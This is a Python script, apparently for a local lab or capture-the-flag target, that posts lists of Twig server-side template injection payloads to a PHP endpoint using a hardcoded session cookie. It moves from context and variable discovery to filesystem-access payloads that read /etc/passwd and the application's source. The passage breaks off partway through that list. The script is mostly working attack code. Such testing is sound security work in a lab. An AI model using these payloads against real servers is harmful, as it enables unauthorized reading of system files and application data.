import requests
import json
import re
from urllib.parse import quote

# Base configuration
base_url = "http://127.0.0.1:5000"
target_endpoint = "/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

# Setup session
session = requests.Session()
session.cookies.set("PHPSESSID", session_cookie)

# Color codes for output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

print(f"[*] Testing Twig SSTI payloads on {base_url}{target_endpoint}")
print(f"[*] POST parameter: name\n")

# Test categories
test_categories = {
    "Basic Variable Discovery": [
        "{{ dump() }}",
        "{{ dump(_context) }}",
        "{{ _context|keys }}",
        "{{ _self }}",
        "{{ _self.vars }}",
        "{{ _self.getTemplateName() }}",
        "{{ _self.env }}",
        "{{ _self.env.getGlobals() }}",
    ],
    
    "Article-related Variables": [
        "{{ article }}",
        "{{ articles }}",
        "{{ items }}",
        "{{ data }}",
        "{{ posts }}",
        "{{ blog }}",
        "{{ content }}",
        "{{ entries }}",
        "{{ list }}",
        "{{ page }}",
        "{{ pages }}",
        "{{ app }}",
    ],
    
    "Iteration and Loops": [
        "{% for item in articles %}{{ loop.index }}: {{ item }},{% endfor %}",
        "{% for item in articles %}{{ loop.index }}: {{ item.title }},{% endfor %}",
        "{% for item in articles %}{{ loop.index }}: {{ item.name }},{% endfor %}",
        "{% for item in articles %}{{ item|keys }},{% endfor %}",
        "{% for item in articles %}{{ dump(item) }},{% endfor %}",
        "{{ articles|length }}",
        "{{ articles|first }}",
        "{{ articles|last }}",
        "{{ articles|keys }}",
        "{{ articles|join(', ') }}",
        "{{ articles|json_encode }}",
        "{{ articles|serialize }}",
    ],
    
    "Filter Functions": [
        "{{ articles|keys|length }}",
        "{{ articles|reverse }}",
        "{{ articles|sort }}",
        "{{ articles|slice(0, 5) }}",
        "{{ articles|batch(2) }}",
        "{{ articles|column('title') }}",
        "{{ articles|filter(x => x.published) }}",
        "{{ articles|map(x => x.title) }}",
        "{{ articles|reduce((carry, v) => carry ~ v.title) }}",
    ],
    
    "Filesystem Access": [
        "{{ include('/etc/passwd') }}",
        "{{ source('/etc/passwd') }}",
        "{{ '/etc/passwd'|file_excerpt(0, 50) }}",
        "{{ '/etc/passwd'|file:50 }}",
        "{% include '/etc/passwd' %}",
        "{{ include('index.php') }}",
        "{{ source('index.php') }}",
